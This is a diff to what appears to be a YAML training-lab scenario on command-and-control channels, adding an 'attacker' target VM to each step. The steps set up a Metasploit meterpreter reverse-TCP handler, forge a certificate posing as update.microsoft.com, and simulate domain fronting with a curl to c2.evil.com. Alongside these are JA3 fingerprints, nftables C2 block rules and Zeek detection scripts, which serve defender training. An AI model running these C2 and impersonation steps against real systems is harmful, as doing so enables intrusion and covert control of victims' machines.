@@ -23,6 +23,7 @@ steps:
   verify:
     type: output_contains
     expect: LHOST
+  target_vm: attacker
   script: msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.20.30.201; set LPORT 4444; show options; exit' 2>&1 | tail -20
   risk_level: low
 - order: 2
@@ -55,6 +56,7 @@ steps:
   verify:
     type: output_contains
     expect: Encoded subdomain
+  target_vm: attacker
   script: 'cat > /tmp/dns_c2_sim.sh << ''SCRIPT''
 
     #!/bin/bash
@@ -119,6 +121,7 @@ steps:
   verify:
     type: output_contains
     expect: HTTP C2 Beacon
+  target_vm: attacker
   script: 'cat > /tmp/http_c2_beacon.sh << ''SCRIPT''
 
     #!/bin/bash
@@ -164,6 +167,7 @@ steps:
   verify:
     type: output_contains
     expect: update.microsoft.com
+  target_vm: attacker
   script: openssl req -x509 -newkey rsa:2048 -keyout /tmp/c2_key.pem -out /tmp/c2_cert.pem -days 365 -nodes -subj '/CN=update.microsoft.com/O=Microsoft Corporation/C=US' 2>&1 && openssl x509 -in /tmp/c2_cert.pem
     -noout -subject -dates
   risk_level: medium
@@ -179,6 +183,7 @@ steps:
   verify:
     type: output_contains
     expect: Domain Fronting
+  target_vm: attacker
   script: "cat > /tmp/domain_fronting_sim.txt << 'EOF'\n=== Domain Fronting Simulation ===\n\nNormal Request:\n  TLS SNI: cdn.cloudflare.com\n  Host Header: cdn.cloudflare.com\n\nDomain Fronted Request:\n\
     \  TLS SNI: cdn.cloudflare.com  (visible to network monitors)\n  Host Header: c2.evil.com     (hidden inside TLS, routed by CDN)\n\ncurl Simulation:\n  curl -H \"Host: c2.evil.com\" https://cdn.cloudflare.com/beacon\n\
     \nDetection Points:\n  1. TLS SNI vs Host header mismatch\n  2. JA3/JA3S fingerprint anomaly\n  3. Unusual CDN traffic patterns\n  4. Certificate transparency logs\nEOF\ncat /tmp/domain_fronting_sim.txt"
@@ -194,6 +199,7 @@ steps:
   verify:
     type: output_contains
     expect: DNS C2 Detection
+  target_vm: attacker
   script: 'timeout 5 tcpdump -i any -nn port 53 -c 20 2>/dev/null | head -20; echo ''---''; echo ''DNS C2 Detection Indicators:''; echo ''1. Query length > 50 chars (normal avg: 15-25)''; echo ''2. Query
     frequency > 10/min to same domain''; echo ''3. TXT record queries (data exfil)''; echo ''4. NXDOMAIN response ratio > 50%'''
   risk_level: low
@@ -209,6 +215,7 @@ steps:
   verify:
     type: output_contains
     expect: JA3
+  target_vm: attacker
   script: "cat > /tmp/ja3_c2_signatures.txt << 'EOF'\n=== Known C2 Framework JA3 Fingerprints ===\n\nCobalt Strike:\n  JA3: 72a589da586844d7f0818ce684948eea\n  JA3: ae4edc6faf64d08308082ad26be60767\n\n\
     Metasploit Meterpreter:\n  JA3: 5d65ea3fb1d4aa7d826733d2f2cbbb1d\n\nSilver C2:\n  JA3: cd08e31494f9531f0ab97c3e0c159e29\n\nPoshC2:\n  JA3: b9b12b0e28d5e8888faa6a0ae1a2e2e2\n\nDetection Strategy:\n \
     \ 1. Collect JA3 from all TLS connections\n  2. Compare against known-bad JA3 database\n  3. Flag unknown JA3 from internal hosts\n  4. Correlate with threat intelligence feeds\nEOF\ncat /tmp/ja3_c2_signatures.txt"
@@ -226,6 +233,7 @@ steps:
   verify:
     type: output_contains
     expect: c2_block
+  target_vm: attacker
   script: "cat > /tmp/c2_block_rules.nft << 'EOF'\n#!/usr/sbin/nft -f\n# C2 Channel Blocking Rules\ntable inet c2_block {\n  set blocked_c2_ips {\n    type ipv4_addr\n    elements = { 198.51.100.1, 203.0.113.50\
     \ }\n  }\n\n  chain output {\n    type filter hook output priority 0; policy accept;\n    # Block known C2 IPs\n    ip daddr @blocked_c2_ips drop\n    # Block non-standard outbound ports (common C2\
     \ ports)\n    tcp dport { 4444, 5555, 8443, 9999 } log prefix \"C2_PORT_BLOCK: \" drop\n    # Rate-limit DNS queries (anti DNS tunneling)\n    udp dport 53 limit rate over 30/second log prefix \"DNS_FLOOD:\
@@ -285,6 +293,7 @@ steps:
   verify:
     type: output_contains
     expect: Beacon likelihood
+  target_vm: attacker
   script: 'cat > /tmp/beacon_detector.sh << ''SCRIPT''
 
     #!/bin/bash
@@ -377,6 +386,7 @@ steps:
   verify:
     type: output_contains
     expect: Framework Network Signature
+  target_vm: attacker
   script: 'cat > /tmp/c2_framework_comparison.txt << ''EOF''
 
     === C2 Framework Network Signature Comparison ===
@@ -429,6 +439,7 @@ steps:
   verify:
     type: output_contains
     expect: dns_request
+  target_vm: attacker
   script: "cat > /tmp/c2_detection.zeek << 'EOF'\n# Zeek Script: C2 Channel Detection\n# DNS Tunneling Detection\nevent dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)\
     \ {\n  if (|query| > 50) {\n    NOTICE([$note=Weird::Activity,\n            $msg=fmt(\"Long DNS query (possible tunneling): %s (%d chars)\", query, |query|),\n            $conn=c]);\n  }\n}\n\n# HTTP\
     \ Beacon Detection (simplified)\nglobal http_conn_count: table[addr] of count = {} &default=0;\nevent http_request(c: connection, method: string, original_URI: string, unescaped_URI: string, version:\
@@ -446,6 +457,7 @@ steps:
   verify:
     type: output_contains
     expect: Red Flags
+  target_vm: attacker
   script: echo | openssl s_client -connect 10.20.30.80:443 -servername 10.20.30.80 2>/dev/null | openssl x509 -noout -issuer -subject -dates -fingerprint 2>/dev/null; echo '---'; echo 'C2 Certificate Red
     Flags:'; echo '1. Self-signed (Issuer == Subject)'; echo '2. Recently created (< 30 days)'; echo '3. Long validity (> 1 year)'; echo '4. Generic CN (localhost, *.com)'; echo '5. Missing SAN extension'
   risk_level: low
@@ -500,6 +512,7 @@ steps:
   verify:
     type: output_contains
     expect: sinkhole
+  target_vm: attacker
   script: 'cat > /tmp/dns_sinkhole.conf << ''EOF''
 
     # DNS Sinkhole Configuration for C2 Domain Blocking
@@ -558,6 +571,7 @@ steps:
   verify:
     type: output_contains
     expect: C2 Infrastructure TTP
+  target_vm: attacker
   script: "cat > /tmp/c2_ttp_report.txt << 'EOF'\n=== C2 Infrastructure TTP Analysis Report ===\n\n1. C2 Techniques Analyzed:\n   T1071.001 - Web Protocols (HTTP/S beacon)\n   T1071.004 - DNS (DNS tunneling)\n\
     \   T1090.004 - Domain Fronting\n   T1573.001 - Encrypted Channel: Symmetric (AES)\n   T1573.002 - Encrypted Channel: Asymmetric (TLS)\n\n2. Detection Methods:\n   - Network: JA3 fingerprint, beacon\
     \ interval analysis, DNS anomaly\n   - Endpoint: Process-network correlation, certificate validation\n   - SIEM: Correlation rules for C2 indicators\n\n3. Blocking Strategies:\n   - nftables: Port/IP\
@@ -576,6 +590,7 @@ steps:
   verify:
     type: output_contains
     expect: clean
+  target_vm: attacker
   script: rm -f /tmp/c2_*.pem /tmp/c2_*.sh /tmp/c2_*.txt /tmp/c2_*.zeek /tmp/c2_*.nft /tmp/c2_*.conf /tmp/dns_*.sh /tmp/dns_*.conf /tmp/http_*.sh /tmp/beacon_*.sh /tmp/domain_*.txt /tmp/ja3_*.txt 2>/dev/null;
     echo 'C2 lab files cleaned'; ss -tlnp | grep -E '4444|8080|8443' || echo 'No C2 ports open - environment clean'
   risk_level: low
